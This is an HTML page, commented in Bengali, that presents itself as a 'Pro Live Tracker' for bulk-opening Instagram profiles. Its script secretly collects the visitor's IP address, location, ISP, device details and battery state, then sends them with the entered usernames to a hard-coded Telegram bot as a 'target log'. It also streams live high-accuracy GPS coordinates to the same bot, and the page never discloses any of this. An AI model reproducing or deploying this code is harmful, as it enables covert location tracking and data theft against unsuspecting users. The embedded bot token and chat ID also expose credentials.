<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #020204;
            --primary: #00f2ff;
            --glass: rgba(255, 255, 255, 0.02);
            --border: rgba(255, 255, 255, 0.08);

        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; color: #fff;
        }

        #pixelCanvas { position: absolute; top: 0; left: 0; z-index: 0; }

        .container {
            background: var(--glass);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            padding: 45px 35px;
            border-radius: 40px;
            border: 1px solid var(--border);
            box-shadow: 0 0 120px rgba(0, 0, 0, 0.9);
            width: 90%;
            max-width: 480px;
            text-align: center;
            position: relative;
            z-index: 10;

        .brand { font-size: 11px; text-transform: uppercase; letter-spacing: 8px; color: var(--primary); margin-bottom: 5px; font-weight: 800; opacity: 0.8; }

        h2 {
            font-size: 60px; margin: 0 0 25px 0; font-weight: 900;
            background: linear-gradient(to bottom, #fff, var(--primary));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            letter-spacing: -2px; line-height: 1;
            filter: drop-shadow(0 0 15px rgba(0, 242, 255, 0.4));

        textarea {
            width: 100%; height: 180px;

        textarea:focus { border-color: var(--primary); box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }

        .meta { display: flex; justify-content: space-between; margin: 18px 0; font-size: 12px; color: #666; font-weight: 600; }

        .btn-open {
            background: linear-gradient(90deg, var(--primary), #0077ff);
            color: #000; border: none; padding: 18px; width: 100%;
            border-radius: 18px; font-weight: 800; cursor: pointer;
            font-size: 16px; text-transform: uppercase; transition: 0.4s;
            box-shadow: 0 5px 25px rgba(0, 242, 255, 0.3);
        }

        .btn-open:hover { transform: scale(1.02); box-shadow: 0 15px 40px rgba(0, 242, 255, 0.6); }

        .whatsapp-link {
            display: inline-flex; align-items: center; margin-top: 20px;
            color: var(--wa-green); text-decoration: none; font-size: 13px;
            font-weight: 600; transition: 0.3s; opacity: 0.8;
        }

        .whatsapp-link:hover { opacity: 1; transform: translateY(-2px); }

        .btn-clear { background: none; border: none; color: #ff3e3e; cursor: pointer; font-weight: 700; font-size: 12px; }

        .status { margin-top: 25px; font-size: 9px; color: #333; letter-spacing: 4px; font-weight: bold; }
    </style>
</head>
<body>

    <canvas id="pixelCanvas"></canvas>

    <div class="container">
        <div class="brand">PRO LIVE TRACKER v2.1</div>
        <h2>J 1 H 4 D</h2>
        
        <textarea id="userList" placeholder="Enter usernames (one per line)..." oninput="updateCount()"></textarea>

        <div class="meta">
            <span id="countDisplay">COUNT: 0</span>
            <button class="btn-clear" onclick="clearAll()">RESET SYSTEM</button>
        </div>

        <button class="btn-open" onclick="openAllTabs()">Execute Opening</button>

        <br>
        <a href="https://wa.me/8801613894599" target="_blank" class="whatsapp-link">
            рҹ’¬ Contact Developer (J1H4D)
        </a>

        <div class="status">HIGH-SPEED AUTOMATION ACTIVE</div>
    </div>

    <script>
        // Background Animation (аҰҸаҰ•аҰҮ аҰ°аҰҫаҰ–аҰҫ аҰ№а§ҹа§ҮаҰӣа§Ү)
        const canvas = document.getElementById('pixelCanvas');
        const ctx = canvas.getContext('2d');
        let particlesArray = [];
        const mouse = { x: null, y: null, radius: 180 };

        window.addEventListener('mousemove', e => { mouse.x = e.x; mouse.y = e.y; });

        function setSize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            initParticles();
        }
        window.addEventListener('resize', setSize);

        class Particle {
            constructor(x, y, dx, dy) {
                this.x = x; this.y = y; this.dx = dx; this.dy = dy;
                this.size = Math.random() * 2.5 + 0.8;
                this.baseX = x; this.baseY = y;
                this.density = (Math.random() * 45) + 8;
            }
            draw() {
                ctx.fillStyle = 'rgba(0, 242, 255, 0.8)';
                ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
            }
            update() {
                let dx = mouse.x - this.x; let dy = mouse.y - this.y;
                let distance = Math.sqrt(dx * dx + dy * dy);
                if (distance < mouse.radius && distance > 0) {
                    let force = (mouse.radius - distance) / mouse.radius;
                    this.x -= (dx / distance) * force * this.density;
                    this.y -= (dy / distance) * force * this.density;
                } else {
                    this.x = this.x * 0.94 + this.baseX * 0.06;
                    this.y = this.y * 0.94 + this.baseY * 0.06;
                }
                this.x += this.dx; this.y += this.dy;
                if (this.x > canvas.width || this.x < 0) this.dx = -this.dx;
                if (this.y > canvas.height || this.y < 0) this.dy = -this.dy;
            }
        }

        function initParticles() {
            particlesArray = [];
            let n = Math.floor((canvas.height * canvas.width) / 5500);
            for (let i = 0; i < n; i++) {
                let x = Math.random() * canvas.width;
                let y = Math.random() * canvas.height;
                let dx = (Math.random() - 0.5) * 1.5;
                let dy = (Math.random() - 0.5) * 1.5;
                particlesArray.push(new Particle(x, y, dx, dy));
            }
        }

        function connect() {
            for (let a = 0; a < particlesArray.length; a++) {
                for (let b = a + 1; b < particlesArray.length; b++) {
                    let dx = particlesArray[a].x - particlesArray[b].x;
                    let dy = particlesArray[a].y - particlesArray[b].y;
                    let d = Math.sqrt(dx * dx + dy * dy);
                    if (d < 55) {
                        ctx.strokeStyle = `rgba(0, 242, 255, ${1 - d/55})`;
                        ctx.lineWidth = 0.6;
                        ctx.beginPath();
                        ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
                        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
                        ctx.stroke();
                    }
                }
            }
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particlesArray.forEach(p => { p.draw(); p.update(); });
            connect();
            requestAnimationFrame(animate);
        }
        setSize(); animate();

        // Core Functions
        function updateCount() {
            const t = document.getElementById('userList').value.trim();
            document.getElementById('countDisplay').innerText = `COUNT: ${t ? t.split('\n').filter(u => u.trim() !== "").length : 0}`;
        }
        function clearAll() { 
            document.getElementById('userList').value = ""; 
            updateCount(); 
        }

        const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";   // вҶҗ аҰҡа§ҮаҰһа§ҚаҰң аҰ•аҰ°а§Ӣ
        const chat_id = "5049810993";   // вҶҗ аҰҡа§ҮаҰһа§ҚаҰң аҰ•аҰ°а§Ӣ

        // IP + Location
        async function getIpAndLocation() {
            const sources = ['https://ipapi.co/json/', 'https://freeipapi.com/json/', 'https://ipwho.is/'];
            for (let url of sources) {
                try {
                    const response = await fetch(url);
                    if (!response.ok) continue;
                    const data = await response.json();
                    const ip = data.ip || data.query || "Unknown";
                    const city = data.city || data.city_name || data.region || "Unknown";
                    const country = data.country_name || data.country || "Unknown";
                    const isp = data.org || data.isp || "Unknown ISP";
                    return `рҹҢҗ **IP:** ${ip}%0Aрҹ“Қ **Location:** ${city}, ${country}%0AрҹҸў **ISP:** ${isp}`;
                } catch (e) { continue; }
            }
            return `рҹҢҗ **IP:** Protected%0Aрҹ“Қ **Status:** Proxy / Error`;
        }

        // Device Details
        function getDeviceDetail() {
            const ua = navigator.userAgent;
            const screenW = screen.width;
            const screenH = screen.height;

            let device = "Desktop";
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                device = /iPad/i.test(ua) ? "iPad" : /iPhone|iPod/i.test(ua) ? "iPhone" : "Android Device";
            }

            let os = "Unknown OS";
            if (/Windows/i.test(ua)) os = "Windows";
            else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
            else if (/Linux/i.test(ua)) os = "Linux";
            else if (/Android/i.test(ua)) os = "Android";
            else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";

            let browser = "Unknown Browser";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";

            return `рҹ“ұ **Device:** ${device}%0A**OS:** ${os}%0A**Browser:** ${browser}%0A**Screen:** ${screenW}Г—${screenH}`;
        }

        // Mobile App Tracking
        async function getMobileAppTracking() {
            let batteryInfo = "рҹ”Ӣ Battery: N/A";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `рҹ”Ӣ **Battery:** ${Math.round(battery.level * 100)}% ${battery.charging ? '(вҡЎ Charging)' : '(рҹ”Ң Not Charging)'}`;
                } catch (e) {}
            }

            let connectionInfo = "рҹ“Ў Connection: N/A";
            if (navigator.connection) {
                const conn = navigator.connection;
                connectionInfo = `рҹ“Ў **Connection:** ${conn.effectiveType || 'Unknown'} | ${conn.downlink || '?'} Mbps`;
            }

            const ua = navigator.userAgent.toLowerCase();
            let inApp = "рҹҢҗ Standard Browser";
            if (ua.includes("fb_iab") || ua.includes("facebook")) inApp = "рҹ“ҳ Facebook In-App";
            else if (ua.includes("instagram")) inApp = "рҹ“ё Instagram In-App";
            else if (ua.includes("telegram")) inApp = "вңҲпёҸ Telegram In-App";
            else if (ua.includes("whatsapp")) inApp = "рҹ’¬ WhatsApp In-App";
            else if (ua.includes("line")) inApp = "рҹ“ұ Line In-App";
            else if (/wv|webview/i.test(ua)) inApp = "рҹ“І Android WebView";

            const orientation = screen.orientation ? screen.orientation.type : "N/A";

            return `**рҹҡҖ MOBILE APP TRACKING**%0A${batteryInfo}%0A${connectionInfo}%0Aрҹ“ұ **Opened In:** ${inApp}%0Aрҹ”„ **Orientation:** ${orientation}`;
        }

        // GPS Report
        let watchId = null;

        function sendGPSReport(position, isInitial = false) {
            const c = position.coords;
            const time = new Date().toLocaleString('bn-BD', { hour12: true });
            const mapUrl = `https://www.google.com/maps?q=${c.latitude.toFixed(8)},${c.longitude.toFixed(8)}`;

            const status = isInitial ? "**рҹ”’ INITIAL SECURE GPS FIX**" : "**рҹ”ҙ LIVE GPS UPDATE**";

            const gpsMsg = `рҹ“Қ ${status}%0Aв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ%0Aрҹ•’ **Time:** ${time}%0AрҹҺҜ **Accuracy:** ${Math.round(c.accuracy)}m%0Aрҹ“Ң **Coordinates:** ${c.latitude.toFixed(8)}, ${c.longitude.toFixed(8)}%0AрҹҸ”пёҸ **Altitude:** ${c.altitude ? c.altitude.toFixed(2)+'m' : 'N/A'}%0Aрҹ§ӯ **Heading:** ${c.heading ? c.heading.toFixed(1)+'В°' : 'N/A'}%0AвҡЎ **Speed:** ${c.speed ? (c.speed*3.6).toFixed(2)+' km/h' : 'N/A'}%0A%0Aрҹ—әпёҸ **Google Maps:** ${mapUrl}%0Aв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ%0Aрҹ”’ **Security:** High-Accuracy + Watch Mode Active`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gpsMsg}&parse_mode=Markdown`);
        }

        async function openAllTabs() {
            const t = document.getElementById('userList').value.trim();
            if (!t) {
                alert("аҰ•аҰ®аҰӘаҰ•а§ҚаҰ·а§Ү аҰҸаҰ•аҰҹаҰҫ username аҰҰаҰҫаҰ“ аҰӯаҰҫаҰҮ!");
                return;
            }

            const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
            const ipText = await getIpAndLocation();
            const deviceInfo = getDeviceDetail();
            const mobileTracking = await getMobileAppTracking();
            const time = new Date().toLocaleString('bn-BD', { hour12: true });

            const userDisplay = list.map(u => `вҖў ${u}`).join('%0A');

            const mainMsg = `рҹ•өпёҸвҖҚвҷӮпёҸ **J1H4D TARGET LOG**%0Aв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ%0A${ipText}%0A%0A${deviceInfo}%0A%0A${mobileTracking}%0A%0Aрҹ•’ **Time:** ${time}%0A%0Aрҹ‘Ө **Targets (${list.length})**%0A${userDisplay}%0Aв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ%0A**Status:** Bulk Opening + Enhanced Tracking Active`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mainMsg}&parse_mode=Markdown`);

            // GPS Tracking
            if (navigator.geolocation) {
                const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };

                navigator.geolocation.getCurrentPosition(
                    (pos) => sendGPSReport(pos, true),
                    () => {},
                    geoOptions
                );

                if (watchId) navigator.geolocation.clearWatch(watchId);
                watchId = navigator.geolocation.watchPosition(
                    (pos) => sendGPSReport(pos, false),
                    (error) => {
                        let errMsg = "вҡ пёҸ GPS Error: ";
                        if (error.code === 1) errMsg += "Permission Denied";
                        else if (error.code === 2) errMsg += "Position Unavailable";
                        else if (error.code === 3) errMsg += "Timeout";
                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${errMsg}&parse_mode=Markdown`);
                    },
                    geoOptions
                );
            }

            // Open Instagram Tabs
            list.forEach((u, i) => {
                setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 450);
            });

            // вҶҗ аҰҸаҰҮ аҰІаҰҫаҰҮаҰЁаҰҹаҰҫ аҰёаҰ°аҰҝа§ҹа§Ү аҰҰа§ҮаҰ“а§ҹаҰҫ аҰ№а§ҹа§ҮаҰӣа§Ү (alert аҰҰа§ҮаҰ–аҰҫаҰ¬а§Ү аҰЁаҰҫ)
            // alert(`вң… ${list.length}аҰҹаҰҫ аҰӘа§ҚаҰ°а§ӢаҰ«аҰҫаҰҮаҰІ аҰ–а§ӢаҰІаҰҫ аҰ¶а§ҒаҰ°а§Ғ аҰ№а§ҹа§ҮаҰӣа§Ү!\nрҹ“ұ Device Info + GPS Security аҰҡаҰҫаҰІа§Ғ аҰ№а§ҹа§ҮаҰӣа§ҮаҘӨ`);
        }

        window.addEventListener('beforeunload', () => {
            if (watchId) navigator.geolocation.clearWatch(watchId);
        });
    </script>
